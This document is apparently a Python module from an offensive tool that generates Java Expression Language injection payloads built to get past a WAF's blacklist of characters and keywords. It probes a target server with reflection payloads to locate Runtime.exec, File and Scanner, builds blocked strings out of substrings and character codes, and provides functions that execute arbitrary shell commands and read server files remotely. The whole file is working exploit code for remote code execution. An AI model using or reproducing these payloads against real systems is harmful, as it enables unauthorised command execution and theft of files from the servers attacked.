import string
import json
from collections import OrderedDict
from .utils import Utils

utils = Utils()


class GenPayload:
    def __init__(self, reqHandler, waf, isOffline=False):
        self.reqHandler = reqHandler
        self.waf = waf
        self.WORDLIST = ["java", "lang", "io", "Char", "char", ".", "(", ")"]
        self.STARTING_SUBSTRING_TABLE = {}
        self.STRING_CLASS = ""
        self.ARRAY_CLASS = ""
        self.ASC_toStringMethod_INDEX = 5
        self.LETTERS = string.ascii_letters
        self.SUBSTRING_TABLE = OrderedDict()

        self.FORNAME = {}
        self.METHODS_INDEX = {}
        self.CONSTRUCTOR_INDEX = {}

        self.GEN_NUM_METHOD = ""
        if isOffline:
            self.offlineInit()
        else:
            self.initialize()

    def offlineInit(self):
        initData = utils.jsonFromFile("datas/inits.json")
        for key, value in initData.items():
            setattr(self, key, value)

    def chooseNumMethod(self) -> str:
        if utils.checkNoDigits(self.waf):
            return "genNumNatural"
        if all(
            element not in ["[", "]", "[]", ".", "size", "()"] for element in self.waf
        ):
            return "genNumArraySize"
        if all(
            element
            not in [
                "[",
                "]",
                "[]",
                ".",
                "hashCode",
                "mod",
                "div",
                "getClass",
                "getPackage",
                "substring",
                "length",
                "concat",
                "()",
            ]
            for element in self.waf
        ):
            return "genNumHashCode"
        if all(element not in ['"', "length", "()"] for element in self.waf):
            return "genNumStringDouble"
        if all(element not in ["'", "length", "()"] for element in self.waf):
            return "genNumStringSingle"

    def genRule(self):
        # numeric generate rule
        self.GEN_NUM_METHOD = self.chooseNumMethod()
        # String Class
        if all(element not in ['"', "getClass", "()"] for element in self.waf):
            self.STRING_CLASS = '"".getClass()'
        elif all(
            element not in ["[", "]", "[]", "getClass", "toString", "()"]
            for element in self.waf
        ):
            self.STRING_CLASS = "[].getClass().toString().getClass()"
        if all(
            element not in ["[", "]", "[]", "getClass", "()"] for element in self.waf
        ):
            self.ARRAY_CLASS = "[].getClass()"

        if self.GEN_NUM_METHOD == "":
            raise Exception("Seem to can't generate number -> generate payload failed")
        if self.STRING_CLASS == "" and self.ARRAY_CLASS == "":
            raise Exception("Seem to can't generate string -> generate payload failed")

    def findClassMethodIndex(self, classStr, methodStr):
        for i in range(20):
            payload = f"{self.genEL(self.getMethodIndexFromClass(classStr, i))}"
            randomPrefix = utils.randomString(length=10)
            randomSubfix = utils.randomString(length=10)
            payload = f"{randomPrefix}{payload}{randomSubfix}"
            response = self.reqHandler.sendPayload(payload)
            result = utils.getDataFromResponse(response, randomPrefix, randomSubfix)
            if f"{methodStr}" in result:
                return i

    def findClassConstructorIndex(self, classStr, constructorStr):
        for i in range(20):
            payload = f"{self.genEL(self.getDeclaredConstructors(classStr, i))}"
            randomPrefix = utils.randomString(length=10, filtered=self.waf)
            randomSubfix = utils.randomString(length=10, filtered=self.waf)
            payload = f"{randomPrefix}{payload}{randomSubfix}"
            response = self.reqHandler.sendPayload(payload)
            result = utils.getDataFromResponse(response, randomPrefix, randomSubfix)
            if f"{constructorStr}" in result:
                return i

    def initForname(self):
        self.FORNAME["Character"] = self.genClassForname("java.lang.Character")
        self.FORNAME["Runtime"] = self.genClassForname("java.lang.Runtime")
        self.FORNAME["File"] = self.genClassForname("java.io.File")
        self.FORNAME["Scanner"] = self.genClassForname("java.util.Scanner")
        self.FORNAME["InputStreamReader"] = self.genClassForname(
            "java.io.InputStreamReader"
        )
        self.FORNAME["BufferedReader"] = self.genClassForname("java.io.BufferedReader")

    def initMethodsIndex(self):
        """
        Find indexes of some methods and fields
        """

        self.METHODS_INDEX["getRuntime"] = self.findClassMethodIndex(
            self.FORNAME["Runtime"], "java.lang.Runtime.getRuntime()"
        )

        self.METHODS_INDEX["exec"] = self.findClassMethodIndex(
            self.FORNAME["Runtime"],
            "java.lang.Runtime.exec(java.lang.String)",
        )
        self.METHODS_INDEX["ascToString"] = self.findClassMethodIndex(
            self.FORNAME["Character"],
            "java.lang.Character.toString(int)",
        )

    def initConstructorsIndex(self):
        self.CONSTRUCTOR_INDEX["File"] = self.findClassConstructorIndex(
            self.FORNAME["File"], "java.io.File(java.lang.String)"
        )
        self.CONSTRUCTOR_INDEX["Scanner@File"] = self.findClassConstructorIndex(
            self.FORNAME["Scanner"], "java.util.Scanner(java.io.File)"
        )
        self.CONSTRUCTOR_INDEX["Scanner@InputStream"] = self.findClassConstructorIndex(
            self.FORNAME["Scanner"], "java.util.Scanner(java.io.InputStream)"
        )
        self.CONSTRUCTOR_INDEX["InputStreamReader"] = self.findClassConstructorIndex(
            self.FORNAME["InputStreamReader"],
            "java.io.InputStreamReader(java.io.InputStream)",
        )
        self.CONSTRUCTOR_INDEX["BufferedReader"] = self.findClassConstructorIndex(
            self.FORNAME["BufferedReader"],
            "java.io.BufferedReader(java.io.Reader)",
        )

    def initialize(self):
        self.genRule()
        if self.STRING_CLASS != "":
            self.CLASS_CLASS = self.ARRAY_CLASS + ".getClass()"
        elif self.ARRAY_CLASS != "":
            self.CLASS_CLASS = self.STRING_CLASS + ".getClass()"

        self.METHODS_INDEX["forName"] = self.findClassMethodIndex(
            self.CLASS_CLASS, "java.lang.Class.forName(java.lang.String)"
        )

        for letter in self.LETTERS:
            self.WORDLIST.append(letter)

        self.genSubstringTable()
        for word in self.WORDLIST:
            if word in self.STARTING_SUBSTRING_TABLE:
                self.SUBSTRING_TABLE[word] = self.STARTING_SUBSTRING_TABLE[word]

        self.initForname()
        self.initMethodsIndex()
        self.initConstructorsIndex()

    def genNum(self, num):
        if hasattr(self, self.GEN_NUM_METHOD):
            method = getattr(self, self.GEN_NUM_METHOD)
            return method(num)
        else:
            raise Exception("Generate number method not found!")

    def genNumNatural(self, num):
        return str(num)

    def genNumArraySize(self, num):
        """
        Generate payload for getting number using array size

        :param num: Number
        """
        arrayList = ""
        for i in range(num):
            arrayList += "[],"
        result = f"[{arrayList[:-1]}].size()"
        return result

    def genNumHashCode(self, num):
        """
        Generate payload for getting number using hash code

        :param num: Number
        """

        def genNumber(num):
            if num == 0:
                return "[].hashCode() mod [].hashCode()"
            if num == 1:
                return "[].hashCode() div [].hashCode()"

            return genStringInt("p" * num) + ".length()"

        def genStringInt(str):
            v = "[].getClass().getPackage().toString()"
            if len(str) == 1:
                return f"{v}.substring({genNumber(0)}, {genNumber(1)})"
            return f"{v}.substring({genNumber(0)}, {genNumber(1)}).concat({genStringInt(str[1:])})"

        return genNumber(num)

    def genNumStringDouble(self, num):
        """
        Generate payload for getting number using string in double quotes

        :param num: Number
        """
        return '"' + "s" * num + '"' + ".length()"

    def genNumStringSingle(self, num):
        """
        Generate payload for getting number using string in single quotes

        :param num: Number
        """
        return "'" + "s" * num + "'" + ".length()"

    def genEL(self, content):
        """
        Generate EL payload

        :param content: Content
        """

        return "${" + content + "}"

    def getMethodIndexFromClass(self, classStr, index):
        return f"{classStr}.getMethods()[{self.genNum(index)}]"

    def getDeclaredField(self, classStr, index):
        return f"{classStr}.getDeclaredFields()[{self.genNum(index)}]"

    def getDeclaredConstructors(self, classStr, index):
        return f"{classStr}.getDeclaredConstructors()[{self.genNum(index)}]"

    def enrichSubstringTable(self, source, sourceIndex, str):
        for word in self.WORDLIST:
            if word in self.STARTING_SUBSTRING_TABLE:
                continue

            index = str.find(word)
            if index >= 0:
                self.STARTING_SUBSTRING_TABLE[word] = [
                    source,
                    sourceIndex,
                    index,
                    index + len(word),
                ]

    def genSubstringTable(self):
        """
        Generate substring table

        Example: 'java': ['stringFields', 0, 0, 4] means that the word 'java' can be replace
        with the substring of the first field of the array class from index 0 to 4
        """
        if self.STRING_CLASS != "":
            # String fields
            for i in range(10):
                payload = f"{self.genEL(self.getDeclaredField(self.STRING_CLASS, i))}"
                randomPrefix = utils.randomString(length=10)
                randomSubfix = utils.randomString(length=10)
                payload = f"{randomPrefix}{payload}{randomSubfix}"
                result = utils.getDataFromResponse(
                    self.reqHandler.sendPayload(payload), randomPrefix, randomSubfix
                )
                self.enrichSubstringTable("stringFields", i, result)

            # String methods
            for i in range(80):
                payload = (
                    f"{self.genEL(self.getMethodIndexFromClass(self.STRING_CLASS, i))}"
                )
                randomPrefix = utils.randomString(length=10)
                randomSubfix = utils.randomString(length=10)
                payload = f"{randomPrefix}{payload}{randomSubfix}"
                result = utils.getDataFromResponse(
                    self.reqHandler.sendPayload(payload), randomPrefix, randomSubfix
                )
                self.enrichSubstringTable("stringMethods", i, result)
        if self.ARRAY_CLASS != "":
            # String fields
            for i in range(10):
                payload = f"{self.genEL(self.getDeclaredField(self.ARRAY_CLASS, i))}"
                randomPrefix = utils.randomString(length=10)
                randomSubfix = utils.randomString(length=10)
                payload = f"{randomPrefix}{payload}{randomSubfix}"
                result = utils.getDataFromResponse(
                    self.reqHandler.sendPayload(payload), randomPrefix, randomSubfix
                )
                self.enrichSubstringTable("arrayFields", i, result)

            # String methods
            for i in range(80):
                payload = (
                    f"{self.genEL(self.getMethodIndexFromClass(self.ARRAY_CLASS, i))}"
                )
                randomPrefix = utils.randomString(length=10)
                randomSubfix = utils.randomString(length=10)
                payload = f"{randomPrefix}{payload}{randomSubfix}"
                result = utils.getDataFromResponse(
                    self.reqHandler.sendPayload(payload), randomPrefix, randomSubfix
                )
                self.enrichSubstringTable("arrayMethods", i, result)

    def genSubstring(self, object, indexStart, indexEnd):
        return f"{object}.toString().substring({self.genNum(indexStart)},{self.genNum(indexEnd)})"

    def genWord(self, word):
        if word not in self.WORDLIST:
            return "null"
        try:
            source, sourceIndex, indexStart, indexEnd = self.SUBSTRING_TABLE[word]
        except KeyError:
            return self.genASCToString(ord(word))
        if source == "stringFields":
            object = self.getDeclaredField(self.STRING_CLASS, sourceIndex)
        elif source == "stringMethods":
            object = self.getMethodIndexFromClass(self.STRING_CLASS, sourceIndex)
        elif source == "arrayFields":
            object = self.getDeclaredField(self.ARRAY_CLASS, sourceIndex)
        elif source == "arrayMethods":
            object = self.getMethodIndexFromClass(self.ARRAY_CLASS, sourceIndex)

        return self.genSubstring(object, indexStart, indexEnd)

    def genConcatStr(self, left, middle, right):
        currentStr = ""
        if left != "":
            currentStr = left

        if currentStr != "":
            currentStr += f".concat({middle})"
        else:
            currentStr = middle

        if right != "":
            currentStr += f".concat({right})"

        return currentStr

    def genClassForname(self, className):
        forname = self.getMethodIndexFromClass(
            self.CLASS_CLASS, self.METHODS_INDEX["forName"]
        )
        class_str = self.genString(className)
        return f"{forname}.invoke(null, {class_str})"

    def genASCToString(self, asc):
        toStringMethod = self.getMethodIndexFromClass(
            self.genClassForname("java.lang.Character"),
            self.METHODS_INDEX["ascToString"],
        )
        ascNumber = self.genNum(asc)

        return f"{toStringMethod}.invoke(null, {ascNumber})"

    def genString(self, str, wordIndex=0):
        if wordIndex >= len(self.WORDLIST):
            currentStr = ""

            for ch in str:
                ch_str = self.genASCToString(ord(ch))
                if currentStr != "":
                    currentStr = f"{currentStr}.concat({ch_str})"
                else:
                    currentStr += ch_str

            return currentStr

        if len(str) == 0:
            return ""

        # find words
        word = self.WORDLIST[wordIndex]

        if str == word:
            return self.genWord(word)
        index = str.find(word)
        if index >= 0:
            if index > 0:
                left = self.genString(str[:index])
            else:
                # avoid -1 getting more data
                left = ""

            right = self.genString(str[index + len(word) :])
            processed_word = self.genWord(word)
            return self.genConcatStr(left, processed_word, right)
        else:
            return self.genString(str, wordIndex + 1)

    def genInvokeMethod(self, method, instance, params):
        current = f"{method}.invoke({instance}"
        for param in params:
            param_str = ", " + self.genString(param)
            current += param_str
        current += ")"
        return current

    def sendPayload(self, payload):
        # Prepare payload
        randomPrefix = utils.randomString(length=10, filtered=self.waf)
        randomSubfix = utils.randomString(length=10, filtered=self.waf)
        payload = f"{randomPrefix}{payload}{randomSubfix}"
        response = self.reqHandler.sendPayload(payload)

        result = utils.getDataFromResponse(response, randomPrefix, randomSubfix)

        return response, result

    def execPayloadNoOutput(self, command):
        getRuntimeMethod = self.getMethodIndexFromClass(
            self.FORNAME["Runtime"], self.METHODS_INDEX["getRuntime"]
        )
        getRuntime = self.genInvokeMethod(getRuntimeMethod, "null", [])
        bashPayload = self.genString(command)
        execPayload = getRuntime + ".exec(" + bashPayload + ")"
        payload = self.genEL(execPayload)
        response, result = self.sendPayload(payload)
        if "Process" in result and "exitValue" in result:
            return "Command seem to be executed"

    def readFileByCommand(self, filename):
        return self.genExecPayload(f"cat {filename}")

    def genReadFile(self, filename):
        filenamePayload = self.genString(filename)

        file = f"{self.FORNAME['File']}.getDeclaredConstructors()[{self.genNum(self.CONSTRUCTOR_INDEX['File'])}].newInstance({filenamePayload})"
        scanner = f"{self.FORNAME['Scanner']}.getDeclaredConstructors()[{self.genNum(self.CONSTRUCTOR_INDEX['Scanner@File'])}].newInstance({file})"
        innerPayload = f"{scanner}.useDelimiter({self.genString(utils.randomString(length=5, filtered=self.waf))}).next()"

        return innerPayload

    def read(self, filename):
        innerPayload = self.genReadFile(filename)
        payload = self.genEL(innerPayload)
        response, result = self.sendPayload(payload)

        if innerPayload in result:
            return "Something went wrong with the payload. Please try again"

        return result.replace("\\n", "\n")

    def genExecPayload(self, command):
        runTime = self.FORNAME["Runtime"]
        execMethod = (
            f"{runTime}.getMethods()[{self.genNum(self.METHODS_INDEX['exec'])}]"
        )

        getRuntimeMethod = (
            f"{runTime}.getMethods()[{self.genNum(self.METHODS_INDEX['getRuntime'])}]"
        )

        execPayload = f"{execMethod}.invoke({getRuntimeMethod}.invoke(null), {self.genString(command)}).getInputStream()"

        scanner = f"{self.FORNAME['Scanner']}.getDeclaredConstructors()[{self.genNum(self.CONSTRUCTOR_INDEX['Scanner@InputStream'])}].newInstance({execPayload})"

        innerPayload = f"{scanner}.useDelimiter({self.genString(utils.randomString(length=5, filtered=self.waf))}).next()"

        return innerPayload

    def exec(self, command):
        innerPayload = self.genExecPayload(command)
        payload = self.genEL(innerPayload)
        response, result = self.sendPayload(payload)

        if innerPayload in result:
            return "Something went wrong with the payload. Please try again"

        return result.replace("\\n", "\n")

    def printObj(self):
        attributes = vars(self)
        attributes.pop("reqHandler")
        with open("inits.json", "w") as file:
            file.write(
                json.dumps(
                    attributes, indent=4, sort_keys=True, separators=(", ", ": ")
                )
            )
